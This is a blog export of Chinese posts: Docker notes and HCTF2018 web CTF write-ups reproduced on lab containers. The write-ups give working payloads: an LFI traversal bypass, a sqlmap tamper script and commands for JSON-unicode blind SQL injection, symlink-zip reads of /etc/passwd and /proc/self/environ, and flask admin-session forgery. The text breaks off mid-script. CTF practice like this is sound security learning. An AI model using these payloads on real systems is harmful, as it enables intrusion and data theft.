<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Docker修炼之旅（一）]]></title>
    <url>%2FStudy%2FDocker%2FDocker%E4%BF%AE%E7%82%BC%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[Docker学习过程的一些记录 #前言之前对Docker只停留在用的层面上，只会用docker-compose一键部署，偶尔也会对Dockerfile进行一些修改，但每次改都要查半天搜索引擎才会。所以决定系统学习下Docker，补充下自己的知识。主要参考的是:《第一本Docker书》，当做学习笔记来写吧。 Docker容器概念 Docker容器（Container）类似于一个轻量级的沙箱子（因为Docker是基于Linux内核的虚拟技术，所以消耗资源十分少），Docker利用容器来运行和隔离应用。 容器是从镜像创建的应用运行实例，可以将其启动、开始、停止、删除，而这些容器都是相互隔离、互不可见的。 可以吧每个容器看作一个简易版的Linux系统环境（包括了root用户权限、进程空间、用户空间和网络空间），以及与运行在其中的应用程序打包而成的应用盒子。 镜像自身是只读的。容器从镜像启动的时候，Docker会在镜像的最上层创建一个可写层，镜像本身将保持不变。就像用ISO装系统之后，ISO并没有什么变化一样。 容器就相当于镜像的实例化，我们可以认为，镜像是Docker生命周期的构建或打包阶段，而容器则是启动或执行阶段，具体关系如下图 创建第一个容器安装启动好docker后，先可以通过docker info命令查看docker的一些配置信息，如所有容器和镜像的数量等 然后通过docker run命令创建容器，docker run命令提供了Docker容器的创建到启动过程。我们使用docker run -i -t ubuntu /bin/bash命令我们的第一个容器，这句命令的解释如下 首先告诉Docker执行docker run命令，并且指定了 -i -t两个参数。-i保证容器中的STDIN是开启的，尽管我们没有附着(docker attach命令)到容器中。持久的标准输入是交互式shell的”半边天”，这里说下自己的理解，这个-i参数意思应该就是把STDIN开起来，然后我们就可以通过可以与容器交互，输入命令执行。-t参数告诉Docker为要创建的容器分配一个伪tty终端，这样，新创建的容器才能提供一个交互式shell。若要在命令行下创建一个我们能与之进行交互的容器，这两个参数算是最基本的参数了。接下来，我们告诉Docker基于什么镜像来创建容器，这里使用的是ubuntu，这是一个基础镜像，保存在Docker Hub Registry上，这里指定镜像后，Docker会先检查本地有没有该镜像，没有的话就连接到官方维护的Docker Hub Registry上查找，找到后下载至本地。然后Docker在文件系统内部用这个镜像创建一个新容器，该容器有自己的网络、IP地址，以及一个用来和宿主机进行通信的桥接案例接口最后的/bin/bash告诉Docker在新容器中要运行什么命令，这里的/bin/bash命令是启动了一个Bash shell 使用容器上一步，我们利用ubuntu镜像创建并打开了一个容器，我们可以在里面执行命令，使用下我们的容器。不仅能执行本地命令，需要网络连接的命令也能执行。我们可以使用apt-get命令，安装下vim apt-get update &amp;&amp; apt-get install vim 给容器命名我们可以通过键入exit来退出当前容器，然后用docker ps命令查看本地的容器。 docker ps列出正在运行的容器docker ps -a列出所有的容器docker ps -l列出最后一次运行的容器，包括正在运行的或已经的停止的。docker ps -n x x是数字，表示列出最新几次运行的容器 这里我们用docker ps -l命令列出刚刚退出的容器，如下图 从上面图片可以看到，容器的名称是一个随机的名称，这是由于我们之前创建容器的时候没有指定名称，所以Docker给容器自动生成一个随机名称。按理说名称指不指定不怎么重要，因为可以通过容器ID进行指定。不过实际使用中，肯定是用名称比较方便。所以我们这里介绍下怎么在创建的时候指定名称。我们可以在docker run命令中用--name标志指定如docker run --name Docker_study -i -t ubuntu /bin/bash 重新启动停止的容器上一步中，为了查看docker ps -l命令，我们退出了容器，那么该怎么重新启动该容器呢。我们使用docker start命令，docker start &lt;容器名称&gt; docker start &lt;容器ID&gt;都可以开启容器。如我这里容器名称是Docker_study，于是用docker start Docker_study启动停止的容器。 附着到容器上我们可以看到上一步的截图，使用docker start重新启动了容器后，容器成功运行，但是我们并没有进入到之前的交互式shell中。这时候我们就可以利用docker attach命令附着进入容器,这里我们的命令是docker attach Docker_study 创建守护式容器上面创建的都是交互式容器，我们也可以创建长期运行的容器，名叫守护式容器，没有交互式会话，非常适合运行应用程序和服务，大多数时候我们都需要以守护式模式运行我们的容器，如之前我搭的CTF题目，都是基于守护式模式。下面我们就创建一个守护式容器。使用下面命令:docker run --name daemon_dave -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot; -d参数表示将容器放在后台运行-c参数表示容器要执行的命令这里执行的命令是每隔一秒循环输出hello world 执行完后，通过docker ps查看是否运行，可以看到运行成功 查看容器内部都在干什么——日志我们上面创建了一个守护式容器，根据创建时的命令，容器会循环输出hello world，但我们怎么查看它是否执行呢。这时候就用到了docker logs命令可以使用docker logs &lt;容器名称或ID&gt;查看容器日志，会返回最后几条日志。我们还可以通过使用 -f 参数实施监控Docker日志，与tail -f命令类似 还可以加别的参数，使日志输出更加规范 –tail 10 获取日志最后10行–tail 0 -f跟踪容器最新日志-t 为每条日志加上时间戳，便于分析 查看容器的进程使用docker top命令，可以查看到容器内部运行的进程。 在容器内部运行进程在Docker 1.3之后，可以通过docker exec命令在容器内部额外启动新进程。可以通过追加-d或-t -i参数指定启动的进程类型是后台任务还是交互式任务。如我们用docker exec -d daemon_save touch miracle778.txt，新建一个文件然后用docker exec -i -t daemon_save /bin/bash打开一个交互式shell可以看到， 在新打开的shell里面输入ls命令，找到了新建的miracle778.txt文件 容器的停止、重启可以使用docker start|stop|restart &lt;容器名或ID&gt;启动|停止|重启容器。另外，可以在创建容器的时候指定 –restart标志，使容器在因为错误情况退出的情况下，根据–restart标志指定的行为和容器错误代码判断是否重启容器。–restart标志取值说明如下 –restart=always 表示无论容器退出代码是什么，都自动重启容器–restart=on-failure 这样的话，只有容器的退出代码非0时才会自动重启此外on-failure还接受一个可选的重启次数–restart=on-failure:7 表示，在容器的退出代码为非0时，自动重启容器，最多重启7次–restart标志是docker1.2.0后引入的选项 深入容器除了用docker ps获取容器的信息外，我们还可以使用docker inspect来获取容器的更多信息docker inspect命令会对容器进行详细的检查，然后返回其配置信息，包括名称、命令、网络配置以及很多有用的数据。同时也可以指定-f或–format标志选定查看结果这个命令我目前并没有怎么用到，不过还是记一下。 删除容器当容器不用的时候，可以通过docker rm删除已经停止的容器。另外提一下，现在没有办法一次删除所有容器，不过可以用另一种小技巧达到目的 docker rm &#x60;docekr ps -a -q&#x60;这里把docker ps -a -q的结果传给docker rm命令docker ps -a -q命令是列出所有容器的ID 总结这一篇主要是对Docker容器的一些操作，用了一些docker的命令12docker run | docker stop | docker start | docker restart | docker exec docker top | docker logs | docker attach | docker inspect | docker rm 其他的一些命令可以参考:简书:Docker命令或者直接找官方文档:Docker官方文档]]></content>
      <categories>
        <category>Study</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF2018-warm_up、kzone]]></title>
    <url>%2FCTF%2FHCTF2018%2FHCTF2018-warm-up%E3%80%81kzone.html</url>
    <content type="text"><![CDATA[HCTF2018 Web题 warm up和 kzone 复现 前言继续CTF复现，这次是HCTF2018 Web题里的 warmup 和 kzone，docker地址就不放了，见前面的文章。 warmup这题好像是签到题，比较简单。题目进去是一个滑稽图片，很容易能够在源码里找到提示:source.php于是直接访问source.php，就得到源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950source.php&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; 这里主要是一个文件包含的漏洞，然后有白名单，白名单里只有source.php和hint.php，于是访问另一个白名单文件hint.php，http://xx.xx.xx.xx:9999/?file=hint.php然后页面返回内容为flag not here, and flag in ffffllllaaaagggg，这个意思应该是flag在ffffllllaaaagggg文件里面。那现在就要解决如何绕过白名单，包含ffffllllaaaagggg文件这个问题。 于是看到源代码，看到checkFile函数，发现里面把传入的file参数做了个?截断处理，估计这个跟出flag有关。后面搜索之后，发现这题是利用phpmyadmin 4.8.x的一个LFI漏洞，相关文章地址:https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/ 利用思路是，利用添加?绕过白名单，然后来到include $_REQUEST[&#39;file&#39;]这行代码，这里是利用文件名后加?/，使得hint.php?/变为一个不存在的文件名，绕过checkFile函数，然后再在后面添加../进行目录穿越(只适用于linux) 然后跟hint.php的内容一联系，构造?file=hint.php?/../ ··· ../ffffllllaaaagggg格式的payload依次尝试，最后发现在跳跃4层目录后成功访问?file=hint.php?/../../../../ffffllllaaaagggg，得到flag。 kzone题目进去是个钓鱼网站，会转到QQ空间。既然是钓鱼网站，那就扫下后台有没有别的文件。发现了www.zip等一系列文件，把www.zip文件下载下来，是整个网站的源码。 代码结构如下: admin文件夹：管理整个钓鱼网站，导出、查看、删除钓鱼信息include文件：包含一些功能性文件2018.php：钓鱼插入文件 几个关键代码如下。首先看到 include/common.php12345678910111213141516171819202122232425common.php&lt;?php error_reporting(0);header('Content-Type: text/html; charset=UTF-8');define('IN_CRONLITE', true);define('ROOT', dirname(__FILE__).'/');define('LOGIN_KEY', 'abchdbb768526');date_default_timezone_set("PRC");$date = date("Y-m-d H:i:s");session_start();include ROOT.'../config.php';if(!isset($port))$port='3306';include_once(ROOT."db.class.php");$DB=new DB($host,$user,$pwd,$dbname,$port);$password_hash='!@#%!s!';require_once "safe.php";require_once ROOT."function.php";require_once ROOT."member.php";require_once ROOT."os.php";require_once ROOT."kill.intercept.php";?&gt; 这里common.php定义了一些常量，然后包含include目录下的其他文件，包括safe.php、member.php等，其中safe.php代码如下123456789101112131415161718192021222324252627282930313233343536373839404142safe.php&lt;?phpfunction waf($string)&#123; $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'; return preg_replace_callback($blacklist, function ($match) &#123; return '@' . $match[0] . '@'; &#125;, $string);&#125;function safe($string)&#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = safe($val); &#125; &#125; else &#123; $string = waf($string); &#125; return $string;&#125;foreach ($_GET as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_GET[$key] = $value;&#125;foreach ($_POST as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_POST[$key] = $value;&#125;foreach ($_COOKIE as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_COOKIE[$key] = $value;&#125;unset($cplen, $key, $value);?&gt; 这里safe.php做了一个过滤，把一些SQL语句的关键词给过滤了，过滤对象为GET、POST、COOKIE数组。然后是member.php，代码如下123456789101112131415161718192021222324252627282930313233member.php&lt;?phpif (!defined('IN_CRONLITE')) exit();$islogin = 0;if (isset($_COOKIE["islogin"])) &#123; if ($_COOKIE["login_data"]) &#123; $login_data = json_decode($_COOKIE['login_data'], true); $admin_user = $login_data['admin_user']; $udata = $DB-&gt;get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"); if ($udata['username'] == '') &#123; setcookie("islogin", "", time() - 604800); setcookie("login_data", "", time() - 604800); &#125; $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $login_data['admin_pass']) &#123; $islogin = 1; &#125; else &#123; setcookie("islogin", "", time() - 604800); setcookie("login_data", "", time() - 604800); &#125; &#125;&#125;if (isset($_SESSION['islogin'])) &#123; if ($_SESSION["admin_user"]) &#123; $admin_user = base64_decode($_SESSION['admin_user']); $udata = $DB-&gt;get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"); $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $_SESSION["admin_pass"]) &#123; $islogin = 1; &#125; &#125;&#125;?&gt; 这里就存在问题了，首先是这里对cookie数组里的数据执行了SQL语句进行验证，存在注入点，然后是后面比较密码的时候用到的是弱比较。那现在要解决的是，如何绕过safe.php里面的waf，这里就看到了第7行的json_decode，这里把COOKIE数组进行了一个json_decode处理，这里找到一篇浅谈json参数解析对waf绕过的影响 简单讲，就是利用json解码的时候，会把\u开头的unicode字符转回unicode对应的字符，即可以忽视掉waf里面的过滤，进行盲注。我们可以看到代码里面两个if判断，都有相应setcookie处理，于是我们就可以把页面响应里含不含setcookie作为盲注的标志。当用户名存在，密码错误的时候，返回两个setcookie，当用户名、密码都错误时，返回四个setcookie，当用户名错误，密码正确的时候，返回两个setcookie··· 于是我们就可以在cookie里构造数据进行盲注，如用\u0075nion代替union。然后这里就可以用sqlmap跑一下了，编写sqlmap的tamper脚本如下 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = '''&#123;"admin_user":"admin%s","admin_pass":65&#125;;''' payload = payload.lower() payload = payload.replace('u', '\u0075') payload = payload.replace('o', '\u006f') payload = payload.replace('i', '\u0069') payload = payload.replace('\'', '\u0027') payload = payload.replace('"', '\u0022') payload = payload.replace(' ', '\u0020') payload = payload.replace('s', '\u0073') payload = payload.replace('#', '\u0023') payload = payload.replace('&gt;', '\u003e') payload = payload.replace('&lt;', '\u003c') payload = payload.replace('-', '\u002d') payload = payload.replace('=', '\u003d') payload = payload.replace('f1a9', 'F1a9') payload = payload.replace('f1', 'F1') return data % payload 然后把抓包结果保存为txt文件，hctf_kzone.txt如下12345678910GET /admin/ HTTP/1.1Host: xx.xx.xx.xx:7777Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: islogin=1;login_data=*Connection: close 注意在参数位置加上*指定，然后sqlmap运行时指定为布尔盲注 --technique=B，指定错误时的回显为window.location --not-string=window.location 然后就开始执行跑sqlmap吧。爆数据库python sqlmap.py -r hctf_kzone.txt --tamper hctf_kzone --technique=B --dbms mysql --not-string=window.location --thread=10 --dbs爆表python sqlmap.py -r c:\\Users\\HP\\Desktop\\hctf_kzone.txt --tamper hctf_kzone --technique=B --dbms mysql --not-string=window.location --thread=10 -D hctf_kouzone --tables爆列python sqlmap.py -r c:\\Users\\HP\\Desktop\\hctf_kzone.txt --tamper hctf_kzone --technique=B --dbms mysql --not-string=window.location --thread=10 -D hctf_kouzone -T F1444g --columns爆flagpython sqlmap.py -r c:\\Users\\HP\\Desktop\\hctf_kzone.txt --tamper hctf_kzone --technique=B --dbms mysql --not-string=window.location --thread=10 -D hctf_kouzone -T F1444g -C F1a9 --dump 这道题还可以自己写python脚本盲注，而且可以不利用json解码这个点，以后再来写吧，最近心态有点崩。。。 参考https://www.anquanke.com/post/id/163958#h2-4]]></content>
      <categories>
        <category>CTF</category>
        <category>HCTF2018</category>
      </categories>
      <tags>
        <tag>HCTF2018</tag>
        <tag>CTF复现</tag>
        <tag>盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF2018-Hide_and_seek]]></title>
    <url>%2FCTF%2FHCTF2018%2FHCTF2018-Hide-and-seek.html</url>
    <content type="text"><![CDATA[HCTF2018 Web题 Hide_and_seek 复现 前言今天复现一下HCTF2018里的Hide_and_seek。先贴一下docker github地址https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/HCTF2018/Hideandseek部署完之后，还有点小问题，需要解决下，首先是上传文件存放在./uploads文件夹下，这个镜像里没有，所以要自己在app目录下建一个uploads文件夹。然后是DockerFile需要改下，加上一行内容ENV UWSGI_INI /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini 审题环境部署好后，点击题目去，如下图随便点点，发现只有登录功能有用，没有注册功能，简单测试一下登录功能，发现随便输用户名和密码，都能以输入的用户名登录，除了admin之外。登录之后，来到一个上传页面。上传页面说让上传zipfile，于是随便压缩一个1.txt文件，1.txt文件里内容为Miracle778 test。然后上传这个zip包，然后网页回显如下图，网站把上传的zip里的文件解压了，然后输出。 于是理所当然的就联想能不能用zip去读非本地文件呢? 答案是肯定的，我们可以压缩一个软链接，类似于windows下的快捷方式，然后网站后台会解压读取该软链接指向的服务器上的文件，就能达到读取任意文件的效果。例如我们使用ln -s /etc/passwd passwd命令生成一个指向/etc/passwd文件的软链接，然后用zip -y passwd.zip passwd命令压缩，然后上传，结果如下图，成功读取。 上面发现一个任意文件读取漏洞，我们可以与前面admin不能登录联系一下，猜测这里可能是要用软链接读取相关文件使得可以用admin身份登录或者是直接读flag文件。不过后者应该几率不大，因为如果能直接读flag文件的话，那前面设置admin不让登录就没有那个必要。所以，大概率是读取跟admin相关的文件，然后以admin身份登录出flag，那么跟admin相关的文件有什么呢，密码文件肯定不是的，因为这个登录就没用到密码，没用到数据库，那既然没用到数据库，程序怎么知道登录用户身份呢，只能是通过session或cookie。于是看一下页面cookie信息，session=eyJ1c2VybmFtZSI6Ik1pcmFjbGU3NzgifQ.D9ZqoQ.55S3MNA12PX-uvm9ELiK4O9Uie0，很像flask的session信息，于是用脚本解密一下，发现还真是flask的session，内容为{&#39;username&#39;:&#39;Miracle778&#39;}。 到这里思路就大致清晰了，我们要用到上传zipfile读取到SECRET_KEY，然后伪造admin的session进行登录。 做题上面把思路理的差不多了，现在就是做题了。这里首先要解决的就是文件路径的问题，我们不知道服务器上有哪些文件，就无法生成软链接进行读取。所以这里还考了linux的一些知识 —— linux一些危险系统文件路径。 这里我也就不做分析了，我也是看wp来的，这里主要用到了linux的/proc目录，参考文章:https://www.cnblogs.com/DswCnblog/p/5780389.html。 /proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 我们这里用到的是/proc/self/environ environ是 — 当前进程的环境变量列表，self可以替换成进程号。 我们生成/proc/self/environ的软链接，压缩后上传，得到flask的环境变量，简单整理下放在下面。123456789101112131415161718192021222324HOSTNAME=7ba9b7bc961aSHLVL=1PYTHON_PIP_VERSION=19.1.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniWERKZEUG_SERVER_FD=3NGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2WERKZEUG_RUN_MAIN=trueNGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=1LISTEN_PORT=80STATIC_INDEX=0PWD=/appPYTHONPATH=/appSTATIC_PATH=/app/static 扫一眼过去，能够发现一项UWSGI_INI，以INI结尾，应该是个配置文件，网上搜索一下，结果放在了下面。 uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议， 然后再看到这一项的值it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini，这样看来，这个文件必有问题，于是构造软链接，生成zip，上传读取。得到/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件内容如下。1234[uwsgi]module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_maincallable=applogto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log 简单搜一下，就能明白module、callable选项的含义。于是可知main.py源码路径为/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 然后就是读取该文件源码，构造软链接、生成zip包，上传得文件内容1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['zip'])def allowed_file(filename): return '.' in filename and \ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET'])def index(): error = request.args.get('error', '') if(error == '1'): session.pop('username', None) return render_template('index.html', forbidden=1) if 'username' in session: return render_template('index.html', user=session['username'], flag=flag.flag) else: return render_template('index.html')@app.route('/login', methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] if request.method == 'POST' and username != '' and password != '': if(username == 'admin'): return redirect(url_for('index',error=1)) session['username'] = username return redirect(url_for('index'))@app.route('/logout', methods=['GET'])def logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/upload', methods=['POST'])def upload_file(): if 'the_file' not in request.files: return redirect(url_for('index')) file = request.files['the_file'] if file.filename == '': return redirect(url_for('index')) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a zipfile' try: extract_path = file_save_path + '_' os.system('unzip -n ' + file_save_path + ' -d '+ extract_path) read_obj = os.popen('cat ' + extract_path + '/*') file = read_obj.read() read_obj.close() os.system('rm -rf ' + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1): return redirect(url_for('index', error=1)) return Response(file)if __name__ == '__main__': #app.run(debug=True) app.run(host='0.0.0.0', debug=True, port=10008) 看到代码第29行，可以知道flag是藏在/app/flag.py文件里，想着是不是可以生成下软链接直接读取呢，后面测试，发现还是提示you are not admin然后重定向到index页面，原来是第79行处，执行了一个判断，如果通过上传的zip打开的文件里面有含有hctf的话，就会重定向到index?error=1页面，所以这条路是行不通的，对应了前面我的分析。所以只能通过找SECRET_KEY这个方法了，我们看到第11行 app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)，SECRET_KEY居然等于一个随机数字字符串，这就有点懵了，难道每次SECRET_KEY能不一样，这也tm行吗。。后面发现，原来在这行代码之前第9行处，有一个random.seed(uuid.getnode())，设置随机数种子操作。我们知道，python random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的。于是我们把注意力放到这里的伪随机数种子，uuid.getnode()，通过查询可以知道，这个函数可以获取网卡mac地址并转换成十进制数返回。也就是说，只要搞到服务器的网卡mac地址，就能确定种子，进而确定SECRET_KEY，那服务器网卡mac地址又怎么获得呢？我们知道有一句话叫，linux中一切皆文件，没错，网卡mac地址也能在文件中找到。可以通过读/sys/class/net/eth0/address文件得到mac地址，于是构造软链接、生成zip、上传看返回结果，如下图，得到服务器mac地址为:02:42:ac:15:00:02。然后就是把mac地址处理下，转换成10进制，然后设置成seed，生成一下SECRET_KEY。脚本如下123456789101112import uuidimport randommac = "02:42:ac:15:00:02"temp = mac.split(':')temp = [int(i,16) for i in temp]temp = [bin(i).replace('0b','').zfill(8) for i in temp]temp = ''.join(temp)mac = int(temp,2)random.seed(mac)randStr = str(random.random()*100)print(randStr) #结果为 97.9970136622037 得到SECRET_KEY:97.9970136622037 然后调用我在上一篇文章中提到的flask_session_manager脚本，生成admin的session。运行python flask_session_manager.py ncode -s &#39;97.9970136622037&#39; -t &quot;{&#39;username&#39;:&#39;admin&#39;}&quot;得到eyJ1c2VybmFtZSI6ImFkbWluIn0.XPTz5A.F7MvChr04yrat31KWqstSRC_dZs 用新生成的session，替换掉之前的，即可得到flag。 总结通过这个题目了解了linux下面一些系统文件的含义。一切皆文件 参考https://www.kingkk.com/2018/11/hctf2018-web-writeup/#%E4%B8%80%E5%88%87%E7%9A%86%E6%96%87%E4%BB%B6http://momomoxiaoxi.com/ctf/2018/11/12/HCTF2018/]]></content>
      <categories>
        <category>CTF</category>
        <category>HCTF2018</category>
      </categories>
      <tags>
        <tag>HCTF2018</tag>
        <tag>CTF复现</tag>
        <tag>flask session伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF2018-admin]]></title>
    <url>%2FCTF%2FHCTF2018%2FHCTF2018-admin.html</url>
    <content type="text"><![CDATA[HCTF2018 Web题admin复现，把三种解法都试了下 前言在github上找到一些CTF web题的docker，准备拿来复现学习学习。专门搞了个腾讯云学生机搭docker。题目github地址:https://github.com/m0xiaoxi/CTF_Web_dockerhttps://github.com/CTFTraining/CTFTraining 这题是HCTF2018里的admin 审题docker搭好后，访问一下题目，理一下系统结构，如下图。简单测试一圈下来，发现有login、register功能，随便注册一个账号然后登录，发现登录上去后有post、change password、logout功能。然后在index页面源码发现提示，you are not admin，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。于是顺藤摸瓜，去github上找一下网站源码，然后进行代码审计。github地址:https://github.com/woadsl1234/hctf_flask代码结构简单如下图是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码1234@app.route('/')@app.route('/index')def index(): return render_template('index.html', title = 'hctf') 发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码1234567891011&#123;% include('header.html') %&#125;&#123;% if current_user.is_authenticated %&#125;&lt;h1 class="nav"&gt;Hello &#123;&#123; session['name'] &#125;&#125;&lt;/h1&gt;&#123;% endif %&#125;&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;&lt;h1 class="nav"&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;&#123;% endif %&#125;&lt;!-- you are not admin --&gt;&lt;h1 class="nav"&gt;Welcome to hctf&lt;/h1&gt;&#123;% include('footer.html') %&#125; 发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。route.py部分函数代码如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758@app.route('/register', methods = ['GET', 'POST'])def register(): if current_user.is_authenticated: return redirect(url_for('index')) form = RegisterForm() if request.method == 'POST': name = strlower(form.username.data) if session.get('image').lower() != form.verify_code.data.lower(): flash('Wrong verify code.') return render_template('register.html', title = 'register', form=form) if User.query.filter_by(username = name).first(): flash('The username has been registered') return redirect(url_for('register')) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash('register successful') return redirect(url_for('login')) return render_template('register.html', title = 'register', form = form)@app.route('/login', methods = ['GET', 'POST'])def login(): if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form)@app.route('/logout')def logout(): logout_user() return redirect('/index')@app.route('/change', methods = ['GET', 'POST'])def change(): if not current_user.is_authenticated: return redirect(url_for('login')) form = NewpasswordForm() if request.method == 'POST': name = strlower(session['name']) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash('change successful') return redirect(url_for('index')) return render_template('change.html', title = 'change', form = form) 接下来就进入代码审计，出flag环节了，下面就把三种解法分别讲下。 解法一 —— flask session 伪造flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。具体参考:https://www.leavesongs.com/PENETRATION/client-session-security.html 我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY，在github源码里找找，可以在config.py里发现下面代码123456import osclass Config(object): SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test' SQLALCHEMY_TRACK_MODIFICATIONS = True 估计ckj123就是SECRET_KEY，所以session伪造这条路可行，于是到github上面找找看有没有flask session加密的脚本。 把脚本down下来，然后执行，脚本代码如下。flask_session_manager.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158""" Flask Session Cookie Decoder/Encoder """__author__ = 'Wilson Sumanang, Alexandre ZANNI'# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0 raise 